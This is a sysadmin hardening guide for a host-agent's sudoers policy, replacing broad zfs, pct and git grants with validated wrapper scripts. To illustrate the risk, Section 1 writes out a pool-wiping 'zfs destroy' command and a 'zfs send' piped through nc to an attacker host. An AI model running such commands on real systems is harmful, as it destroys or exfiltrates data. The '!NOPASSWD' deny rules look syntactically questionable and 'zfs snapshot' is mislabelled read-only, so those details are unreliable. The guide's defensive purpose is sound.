# OPS-HARDENING.md — PolyClaw Host-Agent Privilege Hardening Guide

> **TL;DR:** Replace broad `/sbin/zfs`, `/usr/sbin/pct`, and `/usr/bin/git`
> sudo grants with the three validated wrapper scripts.  The wrapper scripts
> validate every argument before exec, log to syslog + audit file, and are
> the only paths granted in `/etc/sudoers.d/clash-agent`.

---

## 1. Problem: Why Broad sudoers Is Dangerous

A typical first-pass install grants:

```
clash-agent ALL=(root) NOPASSWD: /sbin/zfs
```

This allows `clash-agent` to run **any** `zfs` subcommand with no restrictions —
including `zfs destroy tank` (wipes the whole pool) or
`zfs send tank | nc attacker.example.com 9999` (data exfiltration).

If the host-agent process is compromised (e.g. via a crafted mTLS request that
exploits a deserialization bug), the attacker inherits the full `/sbin/zfs`
privilege.

The wrappers in `crates/host-agent/wrappers/` are the mitigation.

---

## 2. Wrapper Scripts

All three wrappers share the same security model:

| Property | Detail |
|---|---|
| **Ownership/mode** | `root:root 0755` — writeable only by root |
| **No shell interpolation** | User-supplied data is validated, then passed as a discrete exec argv token |
| **Exec-array pattern** | The final `exec "$BIN" arg1 arg2 …` replaces the wrapper process; no subshell |
| **Syslog** | Every call (allowed or denied) is logged via `logger(1)` |
| **Arg count cap** | Maximum argument counts prevent argv overflow attempts |

### 2.1 `pct-create-wrapper`

- **Installed to:** `/usr/local/sbin/pct-create-wrapper`
- **Validates:**
  - VMID: decimal integer, 100–999999
  - ostemplate: `local:vztmpl/…` or `/var/lib/vz/template/cache/…` — no path traversal
  - Optional flags: explicit allowlist (`--hostname`, `--memory`, `--cores`, …)
  - Shell metacharacters in flag values are rejected
- **Calls:** `exec /usr/sbin/pct create "$VMID" "$OSTEMPLATE" "${validated_flags[@]}"`

### 2.2 `zfs-destroy-wrapper`

- **Installed to:** `/usr/local/sbin/zfs-destroy-wrapper`
- **Default state: DISABLED.** Must be enabled explicitly in config:

  ```toml
  [wrappers.zfs_destroy]
  enabled = true
  allowed_uids = [1001]  # UID of clash-agent
  ```

- **Validates:**
  - Dataset/snapshot name: mirrors `is_valid_dataset_name` / `is_valid_dataset_or_snapshot`
    from `crates/host-agent/src/zfs/mod.rs` — no `..`, no leading `/`, no trailing `/`
  - Caller UID must be in `allowed_uids`
  - Writes a structured JSON audit line to `/var/log/clash/zfs-destroy-wrapper.log`
    **before** exec
- **Calls:** `exec /sbin/zfs destroy "$TARGET"`

### 2.3 `git-safe-wrapper`

- **Installed to:** `/usr/local/sbin/git-safe-wrapper`
- **Validates:**
  - `working_dir`: absolute path, no `..`, resolved via `realpath --canonicalize-missing`,
    must appear literally in `[git] allowed_repos` from config
  - Must be an actual git repo (`$dir/.git` must exist)
  - Sub-command: only `status`, `fetch`, `pull`, `log`, `diff`
  - Optional branch/ref: mirrors `is_valid_branch_name` from the GitAdapter
  - `log` is forced to `--oneline -20` (no arbitrary format strings)
- **Calls:** `cd "$CANONICAL_DIR" && exec /usr/bin/git "$CMD" "${extra_args[@]}"`

## 3. Replacing Broad sudoers Entries

### Step 1: Verify wrappers are installed

```bash
ls -la /usr/local/sbin/pct-create-wrapper \
        /usr/local/sbin/zfs-destroy-wrapper \
        /usr/local/sbin/git-safe-wrapper
# Expected: -rwxr-xr-x  1 root root  ...
```

### Step 2: Check for risky entries via the API

```bash
# With your mTLS client cert:
curl -sk --cert /etc/clash/certs/librarian-bundle.pem \
    https://localhost:18443/admin/warn-permissions | jq .
```

Or on the host directly:

```bash
grep -n "ALL\|zfs\|pct\|git" /etc/sudoers /etc/sudoers.d/* 2>/dev/null
```

### Step 3: Replace the broad entry

**Before (risky):**
```
clash-agent ALL=(root) NOPASSWD: /sbin/zfs
```

**After (hardened) — `/etc/sudoers.d/clash-agent`:**
```
# PolyClaw Host-Agent — wrapper-only policy
# Generated by install.sh; validate with: visudo -cf /etc/sudoers.d/clash-agent

# Wrapper scripts (validated, argument-safe)
clash-agent ALL=(root) NOPASSWD: /usr/local/sbin/pct-create-wrapper
clash-agent ALL=(root) NOPASSWD: /usr/local/sbin/zfs-destroy-wrapper
clash-agent ALL=(root) NOPASSWD: /usr/local/sbin/git-safe-wrapper

# Safe read-only ZFS operations (no wrapper overhead needed)
clash-agent ALL=(root) NOPASSWD: /sbin/zfs list *
clash-agent ALL=(root) NOPASSWD: /sbin/zfs get *
clash-agent ALL=(root) NOPASSWD: /sbin/zfs snapshot *

# PCT read-only
clash-agent ALL=(root) NOPASSWD: /usr/sbin/pct status *

# Deny fallthrough to bare binaries
clash-agent ALL=(root) !NOPASSWD: /sbin/zfs destroy *
clash-agent ALL=(root) !NOPASSWD: /usr/sbin/pct create *
clash-agent ALL=(root) !NOPASSWD: /usr/bin/git *
```

Apply:
```bash
# Always validate before placing in sudoers.d:
visudo -cf /tmp/clash-agent-sudoers
sudo install -o root -g root -m 0440 /tmp/clash-agent-sudoers /etc/sudoers.d/clash-agent
```

### Step 4: Verify the change

```bash
# Should exit 1 (permission denied):
sudo -u clash-agent sudo /sbin/zfs destroy tank/media

# Should succeed:
sudo -u clash-agent sudo /usr/local/sbin/zfs-destroy-wrapper tank/media
# (Will fail validation — wrapper is disabled by default unless opt-in config set)
```

## 4. Enabling the `zfs-destroy-wrapper`

The wrapper is disabled by default to prevent accidental data loss.

Add to `/etc/clash/host-agent.toml`:

```toml
[wrappers.zfs_destroy]
enabled = true
# UID of the clash-agent service account (run: id clash-agent)
allowed_uids = [993]
```

Then reload the config (SIGHUP or `systemctl reload clash-host-agent`).

## 5. Log Rotation

`/etc/logrotate.d/clash-host-agent` is installed by `install.sh` and covers:

```
/var/log/clash/audit.jsonl
/var/log/clash/host-agent.log
/var/log/clash/zfs-destroy-wrapper.log
```

Policy: **daily** or **>100 MiB**, keep **14** compressed archives.

`postrotate` sends `SIGHUP` (via `systemctl reload`) so the daemon reopens
its log file descriptor without restart.

To test:
```bash
sudo logrotate --debug /etc/logrotate.d/clash-host-agent
```

## 6. Runtime Permission Probe

The host-agent exposes two ways to see sudoers warnings:

### 6.1 `/admin/warn-permissions` (API)

```bash
curl -sk --cert /etc/clash/certs/librarian-bundle.pem \
    https://localhost:18443/admin/warn-permissions
```

Returns JSON:
```json
{
  "scanned_at": "2025-03-28T04:00:00Z",
  "files_scanned": 3,
  "risky_entries": [
    {
      "file": "/etc/sudoers.d/clash-agent",
      "line": 3,
      "text": "clash-agent ALL=(root) NOPASSWD: /sbin/zfs",
      "reason": "Broad access to '/sbin/zfs' granted without sub-command restriction; ..."
    }
  ]
}
```

### 6.2 Prometheus metrics

```
host_agent_sudoers_risky_entries 1
```

Alert rule example (Prometheus/Alertmanager):
```yaml
- alert: ClashAgentRiskySudoers
  expr: host_agent_sudoers_risky_entries > 0
  for: 5m
  labels:
    severity: warning
  annotations:
    summary: "Risky sudoers entries detected on {{ $labels.instance }}"
    description: "{{ $value }} risky entries found. Check /admin/warn-permissions."
```

### 6.3 Audit log

When risky entries are found, a WARN event is written to `/var/log/clash/audit.jsonl`:
```json
{"timestamp":"2025-03-28T04:00:00Z","operation":"perm-warn-probe","result":"WARN",
 "details":"…concise list of findings…"}
```

## 7. Quick Remediation Checklist

```bash
# 1. Install wrappers
sudo bash crates/host-agent/install.sh --wrappers-only   # (if you add this flag)
# Or manually:
sudo install -o root -g root -m 0755 crates/host-agent/wrappers/pct-create-wrapper  /usr/local/sbin/
sudo install -o root -g root -m 0755 crates/host-agent/wrappers/zfs-destroy-wrapper /usr/local/sbin/
sudo install -o root -g root -m 0755 crates/host-agent/wrappers/git-safe-wrapper    /usr/local/sbin/

# 2. Replace sudoers
sudo sed -i 's|clash-agent.*NOPASSWD:.*\/sbin\/zfs$|# replaced by wrapper policy|' \
    /etc/sudoers.d/clash-agent
# Then apply the full wrapper-only policy (see Step 3 above)

# 3. Install logrotate
sudo install -o root -g root -m 0644 \
    crates/host-agent/wrappers/logrotate-clash-host-agent \
    /etc/logrotate.d/clash-host-agent

# 4. Verify
sudo logrotate --debug /etc/logrotate.d/clash-host-agent
curl -sk --cert /etc/clash/certs/librarian-bundle.pem \
    https://localhost:18443/admin/warn-permissions | jq .risky_entries
```

## 8. Ansible Role Integration

If you use the Ansible role in `infra/ansible/roles/host-agent/`, the
template at `templates/sudoers.j2` should mirror the wrapper-only policy:

```jinja2
# {{ ansible_managed }}
{{ clash_agent_user }} ALL=(root) NOPASSWD: /usr/local/sbin/pct-create-wrapper
{{ clash_agent_user }} ALL=(root) NOPASSWD: /usr/local/sbin/zfs-destroy-wrapper
{{ clash_agent_user }} ALL=(root) NOPASSWD: /usr/local/sbin/git-safe-wrapper
{{ clash_agent_user }} ALL=(root) NOPASSWD: /usr/sbin/pct status *
{{ clash_agent_user }} ALL=(root) NOPASSWD: /sbin/zfs list *
{{ clash_agent_user }} ALL=(root) NOPASSWD: /sbin/zfs get *
{{ clash_agent_user }} ALL=(root) NOPASSWD: /sbin/zfs snapshot *
{{ clash_agent_user }} ALL=(root) !NOPASSWD: /sbin/zfs destroy *
{{ clash_agent_user }} ALL=(root) !NOPASSWD: /usr/sbin/pct create *
{{ clash_agent_user }} ALL=(root) !NOPASSWD: /usr/bin/git *
```

Variable defaults in `defaults/main.yml`:
```yaml
clash_agent_user: clash-agent
```
